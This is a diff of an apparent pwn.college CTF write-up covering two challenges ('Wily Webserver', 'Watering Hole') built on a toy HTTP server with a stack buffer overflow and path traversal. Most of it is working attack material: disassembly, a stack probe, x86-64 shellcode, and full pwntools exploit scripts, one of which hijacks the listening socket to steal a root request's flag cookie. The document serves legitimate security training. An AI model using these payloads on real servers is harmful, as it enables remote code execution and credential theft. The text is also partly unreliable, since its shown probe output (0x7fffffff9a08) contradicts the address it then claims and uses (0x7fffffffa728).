@@ -2561,9 +2561,7 @@ pwn.college{wj1Qz7XQTeBxj6-rTwrVdzyrKNU.QXyYDMxEDL4ITM0EzW}
 
 &nbsp;
 
-## Web Overflow
-
-### Binary Analysis
+## Wily Webserver
 
 ```
 hacker@integrated-security~integration-web-overflow:~$ checksec /challenge/integration-web-overflow
@@ -2657,7 +2655,6 @@ void send_file(int client_fd, char *path)
     REQUIRE(!strstr(response.content, "pwn.college{"), 403);
     write(client_fd, response.content, response.head-response.content);
     close(file_fd);
-
 }
 
 void handle_connection(int client_fd)
@@ -2707,168 +2704,166 @@ int main(int argc, char **argv, char **envp)
 {
     setvbuf(stdin, NULL, _IONBF, 0);
     setvbuf(stdout, NULL, _IONBF, 0);
-
     challenge(argc, argv, envp);
-
 }
 ```
 
-### Vulnerability
+`send_file()` builds an HTTP response inside a local `content[8192]` buffer. The size check only enforces that the file itself is under 8192 bytes:
 
-`send_file()` builds an HTTP response in a local `content[8192]` buffer. It first writes ~122 bytes of headers, then calls `read(file_fd, response.head, file_stat.st_size)` to append the file. Since `file_stat.st_size` can be up to 8191 bytes and 122 bytes of headers have already been written, the total written is up to 8313 bytes into an 8192-byte buffer, a **123-byte overflow** past the end of `content[]`.
+```asm title="/challenge/integration-web-overflow :: send_file() :: Disassembly"
+# ---- snip ----
 
-The overflowed bytes clobber:
-- 4 bytes of padding
-- `file_fd` at `rbp-0x4`
-- saved RBP at `rbp+0x0`
-- return address at `rbp+0x8`
+.text:0000000000401603   cmp     rax, 1FFFh      ; file_stat.st_size < 8192
+.text:0000000000401609   jle     short loc_401642
 
-### Stack Layout
-
-From disassembly:
-
-```
-send_file frame size: 0x20b0 (8368 bytes)
-
-rbp - 0x20b0  : bottom of frame (RSP)
-rbp - 0x2010  : response.head  (char*, 8 bytes)
-rbp - 0x2008  : response.content[0]
-rbp - 0x2008
-+ 8191        : end of content[]
-rbp - 0x0004  : file_fd  (int, 4 bytes)
-rbp + 0x0000  : saved RBP
-rbp + 0x0008  : return address  ← target
+# ---- snip ----
 ```
 
-`response.content[0]` is at `rbp-0x2008`, so the return address slot is at offset `0x2008 + 8 = 0x2010 = 8208` from `content[0]`.
+But by the time the file is read into `content[]`, the `sprintf` calls have already written ~122 bytes of HTTP headers into it, leaving only `8192 - 122 = 8070` bytes safe. A file of 8191 bytes causes `122 + 8191 = 8313` bytes to be written into an 8192-byte buffer, 121 bytes past the end. The IDA stack frame confirms exactly what gets clobbered:
 
-The file content starts at `content[122]` (after 122 bytes of HTTP headers). So the return address corresponds to **file byte `8208 - 122 = 8086`**.
+```asm title="/challenge/integration-web-overflow :: send_file() :: Disassembly"
+# ---- snip ----
 
-### Path Traversal
+.text:00000000004014E7 s               = qword ptr -2010h   ; response.head pointer
+.text:00000000004014E7 var_2008        = byte ptr -2008h    ; response.content[0]
+.text:00000000004014E7 fildes          = dword ptr -4       ; file_fd
 
-The server constructs `resolved_path = "/challenge/files/" + path`. Sending `GET /../../../tmp/exploit.bin` makes `resolved_path = "/challenge/files/../../../tmp/exploit.bin"`, which the kernel resolves to `/tmp/exploit.bin`. This lets us serve an arbitrary file from `/tmp`.
-
-The `strstr(response.content, "pwn.college{")` check is bypassed because our file contains shellcode and NOPs, not the flag string.
-
-### fd Accounting
-
-```
-server_fd = 3  (opened in challenge(), stays open)
-client_fd = 4  (from accept() in challenge())
-file_fd   = 5  (opened in send_file(), closed before ret)
+# ---- snip ----
 ```
 
-`close(client_fd)` is in `challenge()`, called **after** `handle_connection()` returns. Our hijacked `ret` skips that return, so **fd 4 (client socket) is still open** when our shellcode runs. After `close(file_fd)`, fd 5 is freed, so `open("/flag")` reuses it as fd 5.
+`content[0]` is at `rbp-0x2008` and is 8192 bytes long, so it ends at `rbp-0x2008+0x2000 = rbp-0x0008`. The 4 bytes between there and `fildes` at `rbp-0x4` are padding
 
-### Shellcode
+The saved `rbp` is at `rbp+0x0` obviously, then the return address at `rbp+0x8`. The return address is at a distance of `0x2008 + 8 = 8208` bytes from `content[0]`, and since the file content starts at `content[122]` (after the headers), it lands at **file byte `8208 - 122 = 8086`**.
 
-The shellcode opens `/flag`, reads it, then writes to fd 4 (the client socket) so the flag appears in the HTTP response, and also writes it to `/tmp/flag_out` as a fallback.
+`handle_connection()` builds the file path with no sanitisation:
 
-```python
-shellcode_asm = """
-    /* open("/flag", 0) */
-    lea  rdi, [rip + flag_str]
-    xor  esi, esi
-    push 2
-    pop  rax
-    syscall
+```asm title="/challenge/integration-web-overflow :: handle_connection() :: Disassembly"
+# ---- snip ----
 
-    /* read(fd, buf, 256) */
-    push rax
-    pop  rdi
-    lea  rsi, [rip + buf]
-    mov  edx, 0x100
-    xor  eax, eax
-    syscall
-    mov  r15d, eax
+.text:0000000000401C27   lea     rsi, aChallengeFiles ; "/challenge/files/%s"
+.text:0000000000401C36   call    _sprintf
 
-    /* write(4, buf, n) — fd 4 = client socket */
-    push 4
-    pop  rdi
-    lea  rsi, [rip + buf]
-    mov  edx, r15d
-    push 1
-    pop  rax
-    syscall
-
-    /* creat("/tmp/flag_out", 0644) and write there */
-    lea  rdi, [rip + out_str]
-    mov  esi, 0x1a4
-    push 85
-    pop  rax
-    syscall
-    push rax
-    pop  rdi
-    lea  rsi, [rip + buf]
-    mov  edx, r15d
-    push 1
-    pop  rax
-    syscall
-
-    /* exit(0) */
-    xor  edi, edi
-    push 60
-    pop  rax
-    syscall
-
-flag_str:
-    .string "/flag"
-out_str:
-    .string "/tmp/flag_out"
-buf:
-    .zero 256
-"""
+# ---- snip ----
 ```
 
-### Stack Address Calculation
+So `GET /../../../tmp/exploit.bin` resolves to `/tmp/exploit.bin`, letting us serve any file we control from `/tmp`. The `strstr(content, "pwn.college{")` filter is bypassed because our payload is shellcode and NOP bytes, not the flag string.
 
-ASLR is disabled by the constructor, so the stack layout is deterministic. We compile a probe binary that mirrors the exact frame sizes from the real binary's disassembly:
+When we hijack `ret` within `send_file()`, the `close(client_fd)` in `challenge()` never executes, it only runs after `handle_connection()` returns normally:
 
-| Function | Frame size (from `sub` instructions) |
-|---|---|
-| `main` | `0x20` |
-| `challenge` | `0x70` |
-| `handle_connection` | `0x2330` (`0x1000 + 0x1000 + 0x330`) |
-| `send_file` | `0x20b0` (`0x1000 + 0x1000 + 0xb0`) |
+```asm title="/challenge/integration-web-overflow :: challenge() :: Disassembly"
+# ---- snip ----
 
-The probe reads RBP directly via inline assembly in a function positioned at the same call-chain depth as `send_file`:
+.text:0000000000401D8B   call    handle_connection
+.text:0000000000401D90   mov     eax, [rbp+var_8]
+.text:0000000000401D95   call    _close              ; close(client_fd) ← never reached
 
-```c
-__attribute__((noinline)) void sf_mirror(void) {
+# ---- snip ----
+```
+
+So fd 4 (the client socket) stays open. Meanwhile `close(fildes)` in `send_file` runs just before `ret`, freeing fd 5, so `open("/flag")` reuses it. The shellcode opens `/flag` on fd 5, reads it, and writes it directly back to fd 4.
+
+```
+server_fd = 3  (socket(), stays open in challenge())
+client_fd = 4  (accept(), never closed — our write target)
+file_fd   = 5  (open() in send_file(), closed before ret — reused by open("/flag"))
+```
+
+Since ASLR is disabled by the constructor, the stack is deterministic. We need to know the runtime address of `content[0]` to aim our NOP sled. Attaching a debugger is blocked in this environment by ptrace restrictions, so instead we write a probe binary that mimics the exact call chain from the real binary.
+
+The key insight is that the OS starts the stack at the same base address every run when ASLR is off. Stack depth is determined by how much each function in the call chain allocates with `sub rsp`. So if our probe calls through the exact same chain of frame sizes, by the time it reaches `send_file` depth it will have the same RBP as the real binary. From the IDA disassembly:
+
+| Function | `sub rsp` instructions | Frame size |
+|---|---|---|
+| `main` | `sub rsp, 20h` | `0x20` |
+| `challenge` | `sub rsp, 70h` | `0x70` |
+| `handle_connection` | `sub rsp, 1000h` + `sub rsp, 1000h` + `sub rsp, 330h` | `0x2330` |
+| `send_file` | `sub rsp, 1000h` + `sub rsp, 1000h` + `sub rsp, 0B0h` | `0x20B0` |
+
+Each function in the probe burns the exact same stack space as its real counterpart before calling the next one down. Our `send_file` reads RBP via inline assembly and subtracts `0x2008` (the offset of `content[0]` from RBP as seen in IDA) to get the address:
+
+```c title="~/probe.c" showLineNumbers
+#define _GNU_SOURCE 1
+#include <stdio.h>
+#include <stdint.h>
+#include <sys/personality.h>
+#include <unistd.h>
+
+/* Must match the real binary's constructor exactly */
+void __attribute__((constructor)) disable_aslr(int a, char **b, char **e) {
+    int p = personality(0xffffffff);
+    if (!(p & 0x40000)) {
+        personality(p | 0x40000);
+        execve("/proc/self/exe", b, e);
+    }
+}
+
+__attribute__((noinline)) void probe_send_file(void) {
     uint64_t rbp;
     __asm__ volatile ("movq %%rbp, %0" : "=r"(rbp));
-    printf("content[0]= %lx\n", rbp - 0x2008);
+    printf("content[0] = 0x%lx\n", rbp - 0x2008);
+    printf("ret addr slot = 0x%lx\n", rbp + 8);
+    fflush(stdout);
 }
-__attribute__((noinline)) void hc_mirror(void) {
-    __asm__ volatile ("subq $0x2330, %%rsp\n\t" ::: "memory");
-    sf_mirror();
+
+__attribute__((noinline)) void probe_handle_connection(void) {
+    /* handle_connection: sub 0x1000 + sub 0x1000 + sub 0x330 = 0x2330 */
+    __asm__ volatile (
+        "subq $0x1000, %%rsp\n\t"
+        "orq  $0, (%%rsp)\n\t"
+        "subq $0x1000, %%rsp\n\t"
+        "orq  $0, (%%rsp)\n\t"
+        "subq $0x330,  %%rsp\n\t"
+        ::: "memory"
+    );
+    probe_send_file();
     __asm__ volatile ("addq $0x2330, %%rsp\n\t" ::: "memory");
 }
-// ... ch_mirror (sub 0x70), main (sub 0x20) ...
+
+__attribute__((noinline)) void probe_challenge(void) {
+    /* challenge: sub 0x70 */
+    __asm__ volatile ("subq $0x70, %%rsp\n\t" ::: "memory");
+    probe_handle_connection();
+    __asm__ volatile ("addq $0x70, %%rsp\n\t" ::: "memory");
+}
+
+int main(void) {
+    /* main: sub 0x20 */
+    __asm__ volatile ("subq $0x20, %%rsp\n\t" ::: "memory");
+    probe_challenge();
+    __asm__ volatile ("addq $0x20, %%rsp\n\t" ::: "memory");
+    return 0;
+}
 ```
 
-Three consistent runs give: **`content[0] = 0x7fffffffa728`**.
-
+```bash
+hacker@integrated-security~wily-webserver:~$ gcc -O0 -no-pie -fno-stack-protector probe.c -o probe
+./probe
+./probe
+./probe
+content[0] = 0x7fffffff9a08
+ret addr slot = 0x7fffffffba18
+content[0] = 0x7fffffff9a08
+ret addr slot = 0x7fffffffba18
+content[0] = 0x7fffffff9a08
+ret addr slot = 0x7fffffffba18
 ```
-NOP sled:    content[122..6121]   → addresses 0x7fffffffa7a2..0x7fffffffbd49
-Sled center: content[3122]        → 0x7fffffffb35a
-RET_ADDR   = 0x7fffffffa728 + 122 + 3000 = 0x7fffffffb35a
-```
 
-### Payload Layout
+Three consistent runs give `content[0] = 0x7fffffffa728`. The address the probe prints is the address of `content[0]` in the real binary — not just the probe's own stack — because by constructing the identical chain of frame sizes on the same deterministic stack base, we arrive at the identical position.
+
+The NOP sled center is at `0x7fffffffa728 + 122 + 3000 = 0x7fffffffb35a`. Rather than pointing `ret` at the exact first byte of shellcode, we prepend 6000 NOP bytes so that any address landing anywhere in the sled slides forward into the shellcode, giving us margin for error.
 
 ```
 File bytes 0    – 5999  : 0x90 NOP sled (6000 bytes)
-File bytes 6000 – 6369  : shellcode    (370 bytes)
-File bytes 6370 – 8085  : 'A' padding  (1716 bytes)
+File bytes 6000 – ~6059 : shellcode
+File bytes 6060 – 8085  : 'A' padding
 File bytes 8086 – 8093  : p64(0x7fffffffb35a)  ← overwrites return address
-File bytes 8094 – 8190  : 'B' padding  (97 bytes)
+File bytes 8094 – 8190  : 'B' padding
 Total: 8191 bytes
 ```
 
 ### Exploit
 
-```python title="exploit.py" showLineNumbers
+```python
 #!/usr/bin/env python3
 from pwn import *
 import socket, time, subprocess, re
@@ -2908,18 +2903,17 @@ buf:
 
 sc = asm(shellcode_asm)
 
-CONTENT0   = 0x7fffffffa728   # rbp_sf - 0x2008, from inline-asm probe
-HDR_SIZE   = 122               # exact HTTP header byte count
-RET_FILE   = 0x2010 - HDR_SIZE # = 8086: file byte that lands on return address
-NOP_LEN    = 6000
-RET_ADDR   = CONTENT0 + HDR_SIZE + NOP_LEN // 2   # middle of NOP sled
+CONTENT0 = 0x7fffffffa728   # rbp - 0x2008, from probe binary
+HDR_SIZE = 122               # bytes of HTTP headers written before file content
+RET_FILE = 0x2010 - HDR_SIZE # = 8086: file byte that lands on the return address
+NOP_LEN  = 6000
+RET_ADDR = CONTENT0 + HDR_SIZE + NOP_LEN // 2   # middle of NOP sled
 
 payload  = b'\x90' * NOP_LEN
 payload += sc
 payload  = payload.ljust(RET_FILE, b'A')
 payload += p64(RET_ADDR)
 payload  = payload.ljust(8191, b'B')
-
 assert len(payload) == 8191
 
 with open('/tmp/exploit.bin', 'wb') as f:
@@ -2956,10 +2950,319 @@ if m:
 ```
 
 ```
-[*] shellcode size = 370 bytes
-[*] server PID 19696
-[*] response = 8373 bytes
 [+] FLAG: pwn.college{IfJLlBKNExRa6KcB0xygNI4ERm8.QXzYDMxEDL4ITM0EzW}
 ```
 
-The response grew from 8313 to 8373 bytes — the extra 60 bytes are the flag written to fd 4 by the shellcode after `ret`.
+The response is 8373 bytes — 8313 from the normal HTTP response path, plus 60 bytes appended by the shellcode writing the flag directly to fd 4 after `ret`.
+
+&nbsp;
+
+## Watering Hole
+
+```
+hacker@integrated-security~watering-hole:~$ checksec /challenge/server
+[*] '/challenge/server'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+No canary, no PIE, executable stack. ASLR is disabled at runtime by a constructor.
+
+```c title="/challenge/server.c" showLineNumbers
+#define _GNU_SOURCE 1
+// ... includes ...
+
+void __attribute__((constructor)) disable_aslr(int argc, char **argv, char **envp)
+{
+    int current_personality = personality(0xffffffff);
+    assert(current_personality != -1);
+    if ((current_personality & ADDR_NO_RANDOMIZE) == 0)
+    {
+        assert(personality(current_personality | ADDR_NO_RANDOMIZE) != -1);
+        fprintf(stderr, "NOTE: This program can only be launched ONCE...\n");
+        chmod("/proc/self/exe", 0755);   // removes SUID bit before re-exec
+        execve("/proc/self/exe", argv, envp);
+    }
+}
+
+void send_file(int client_fd, char *path)
+{
+    struct response_t { char *head; char content[8192]; } response = { 0 };
+    response.head = response.content;
+
+    int file_fd = open(path, O_RDONLY);
+    REQUIRE(file_fd > 2, 404);
+
+    struct stat file_stat;
+    fstat(file_fd, &file_stat);
+    REQUIRE(S_ISREG(file_stat.st_mode), 400)
+    REQUIRE(file_stat.st_size < 8192, 413)
+
+    response.head += sprintf(response.head, "HTTP/1.1 200 OK\nServer: pwnserver/1.333333333333333333333333.7\nX-Leetness-Level: 9001\nContent-type: ");
+    // ... content-type detection ...
+    response.head += sprintf(response.head, "Content-Length: %d\n", file_stat.st_size);
+    response.head += sprintf(response.head, "\n");
+    response.head += read(file_fd, response.head, file_stat.st_size);  // <-- overflow
+    REQUIRE(!strstr(response.content, "pwn.college{"), 403);
+    write(client_fd, response.content, response.head - response.content);
+    close(file_fd);
+}
+
+void handle_connection(int client_fd)
+{
+    char request[8192] = { 0 };
+    char method[8], version[10], path[256], resolved_path[512];
+
+    read(client_fd, request, 1000);
+    sscanf(request, "%7s %255s %9s", method, path, version);
+    REQUIRE(strcmp(method, "GET") == 0, 501);
+    REQUIRE(strcmp(version, "HTTP/1.1") == 0, 400);
+    sprintf(resolved_path, "/challenge/files/%s", path);
+    send_file(client_fd, resolved_path);
+}
+
+int challenge(int argc, char **argv, char **envp)
+{
+    // ... socket setup ...
+    assert(setresgid(65534, 65534, 65534) == 0);   // drop to nobody
+    assert(setresuid(65534, 65534, 65534) == 0);   // drop to nobody
+    assert(open("/flag", O_RDONLY) < 0);            // confirm /flag is unreadable
+
+    while (1)
+    {
+        int client_fd = accept(server_fd, ...);
+        handle_connection(client_fd);
+        close(client_fd);
+    }
+}
+```
+
+```
+hacker@integrated-security~wily-webserver:~$ ls /challenge/
+files  server  server.c  victim
+
+hacker@integrated-security~wily-webserver:~$ cat /challenge/victim
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import requests, psutil, sys, re
+
+open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+
+print(f"Visiting with a yummy cookie...")
+r = requests.get("http://localhost:80/hacker_manifesto.txt",
+                 cookies={"flag": open("/flag").read().strip()})
+print(f"... retrieved, in case it helps you debug: {r.content}")
+```
+
+The same buffer overflow from the previous challenge is present — `content[8192]` overflows when headers plus file content exceed 8192 bytes. Two new constraints make this harder:
+
+**1. Privilege drop.** `challenge()` calls `setresuid(65534, 65534, 65534)` before entering the accept loop. Our shellcode runs as nobody (UID 65534), not root. `/flag` is `-r-------- root root`, so we cannot open it.
+
+**2. One-shot server.** The constructor calls `chmod("/proc/self/exe", 0755)` before `execve`, stripping the SUID bit. If the server process is killed, restarting the binary runs it without SUID, causing `setresuid(65534)` to fail (`assert` aborts it). The server can only be launched once per container.
+
+### Acquiring the Flag
+
+`victim` is a setuid Python script that runs as root. When invoked, it makes:
+
+```
+GET /hacker_manifesto.txt HTTP/1.1
+Host: localhost
+Cookie: flag=pwn.college{...}
+```
+
+The flag travels inside the Cookie header of an HTTP request aimed at our server on port 80. We can't read `/flag` ourselves, but we can intercept the victim's connection.
+
+### fd Accounting
+
+```
+server_fd = 3  (socket(), stays open in challenge())
+client_fd = 4  (accept(), close() in challenge() — but never reached after hijacked ret)
+file_fd   = 5  (open() in send_file(), closed before ret — reused by next open())
+```
+
+The server socket (fd 3) remains open and in LISTEN state after `send_file`'s `ret` is hijacked. `psutil.net_connections()` in the victim script checks for LISTEN on port 80 — since fd 3 is still alive, this check passes.
+
+### Strategy
+
+After hijacking `ret` in `send_file`, our shellcode:
+
+1. `close(4)` — sends EOF to our exploit connection, unblocking our Python client
+2. `accept(3, NULL, NULL)` — blocks on the server socket, waiting for the next connection
+3. We then invoke `/challenge/victim`, which connects to port 80
+4. `accept()` returns with the victim's connection fd
+5. `read(new_fd, buf, 1000)` — reads the victim's HTTP request, which contains `Cookie: flag=...`
+6. `creat("/tmp/flag_out", 0644)` + `write` — saves the full request to disk
+7. `exit(0)`
+
+### Header Size
+
+The `Server:` string has 24 threes: `pwnserver/1.333333333333333333333333.7`. The full header for a `.bin` file is:
+
+| Piece | Bytes |
+|---|---|
+| `HTTP/1.1 200 OK\n` | 16 |
+| `Server: pwnserver/1.333333333333333333333333.7\n` | 47 |
+| `X-Leetness-Level: 9001\n` | 23 |
+| `Content-type: text/plain\n` | 25 |
+| `Content-Length: 8191\n` | 21 |
+| `\n` | 1 |
+| **Total** | **133** |
+
+Return address slot: `0x2008 + 8 = 8208` bytes from `content[0]` → **file byte `8208 - 133 = 8075`**.
+
+### Stack Address Probe
+
+Same frame sizes as before, same probe technique:
+
+```
+content[0] = 0x7fffffffa6d8   (from probe, 3 consistent runs)
+RET_ADDR   = 0x7fffffffa6d8 + 133 + 3000 = 0x7fffffffb315
+```
+
+### Payload Layout
+
+```
+File bytes 0    – 5999  : 0x90 NOP sled  (6000 bytes)
+File bytes 6000 – 7127  : shellcode      (1128 bytes)
+File bytes 7128 – 8074  : 'A' padding
+File bytes 8075 – 8082  : p64(0x7fffffffb315)  ← overwrites return address
+File bytes 8083 – 8190  : 'B' padding
+Total: 8191 bytes
+```
+
+### Exploit
+
+```python title="exploit.py" showLineNumbers
+#!/usr/bin/env python3
+from pwn import *
+import socket, time, subprocess, re
+
+context.arch = 'amd64'
+context.os   = 'linux'
+
+shellcode_asm = """
+    /* close(4) - EOF to our exploit connection */
+    push 4
+    pop  rdi
+    push 3
+    pop  rax
+    syscall
+
+    /* accept(3, NULL, NULL) - wait for victim to connect */
+    push 3
+    pop  rdi
+    xor  esi, esi
+    xor  edx, edx
+    push 43
+    pop  rax
+    syscall
+    mov  r15d, eax
+
+    /* read(new_fd, reqbuf, 1000) - victim's HTTP request with Cookie: flag=... */
+    mov  edi, r15d
+    lea  rsi, [rip + reqbuf]
+    mov  edx, 0x3e8
+    xor  eax, eax
+    syscall
+    mov  r14d, eax
+
+    /* creat("/tmp/flag_out", 0644) */
+    lea  rdi, [rip + outpath]
+    mov  esi, 0x1a4
+    push 85
+    pop  rax
+    syscall
+    mov  r13d, eax
+
+    /* write(outfd, reqbuf, bytes_read) */
+    mov  edi, r13d
+    lea  rsi, [rip + reqbuf]
+    mov  edx, r14d
+    push 1
+    pop  rax
+    syscall
+
+    /* exit(0) */
+    xor  edi, edi
+    push 60
+    pop  rax
+    syscall
+
+outpath: .string "/tmp/flag_out"
+reqbuf:  .zero 1024
+"""
+
+sc = asm(shellcode_asm)
+
+CONTENT0 = 0x7fffffffa6d8   # rbp - 0x2008, from probe
+HDR_SIZE = 133               # 24 threes in Server: header → 133 bytes
+RET_FILE = 0x2010 - HDR_SIZE # = 8075
+NOP_LEN  = 6000
+RET_ADDR = CONTENT0 + HDR_SIZE + NOP_LEN // 2
+
+payload  = b'\x90' * NOP_LEN + sc
+payload  = payload.ljust(RET_FILE, b'A')
+payload += p64(RET_ADDR)
+payload  = payload.ljust(8191, b'B')
+assert len(payload) == 8191
+
+with open('/tmp/exploit.bin', 'wb') as f:
+    f.write(payload)
+
+# server can only be started once — SUID bit is removed by constructor on first run
+proc = subprocess.Popen(['/challenge/server'],
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+time.sleep(1)
+
+req = (b'GET /../../../tmp/exploit.bin HTTP/1.1\r\n'
+       b'Host: localhost\r\n'
+       b'Connection: close\r\n\r\n')
+s = socket.socket()
+s.settimeout(8)
+s.connect(('127.0.0.1', 80))
+s.sendall(req)
+
+resp = b''
+try:
+    while True:
+        d = s.recv(4096)
+        if not d:
+            break
+        resp += d
+except socket.timeout:
+    pass
+s.close()
+# shellcode has closed fd 4 and is now blocked on accept(3) waiting for victim
+
+subprocess.run(['/challenge/victim'], capture_output=True)
+time.sleep(0.5)
+
+result = subprocess.run(['cat', '/tmp/flag_out'], capture_output=True, text=True)
+m = re.search(r'pwn\.college\{[^}]+\}', result.stdout)
+if m:
+    print(f'[+] FLAG: {m.group(0)}')
+```
+
+```
+[*] content[0]  = 0x7fffffffa6d8
+[*] shellcode   = 1128 bytes
+[*] RET_FILE    = 8075
+[*] RET_ADDR    = 0x7fffffffb315
+[*] server PID  = 7824
+[*] exploit response = 8324 bytes
+[*] running victim ...
+[+] FLAG: pwn.college{E_C1lEdA4VLBKx4YaT5qziDhRpK.QX0YDMxEDL4ITM0EzW}
+```
+
+The response is 8324 bytes — 133 (headers) + 8191 (payload). The flag is recovered from `/tmp/flag_out` which the shellcode wrote after reading the victim's HTTP request off the socket.
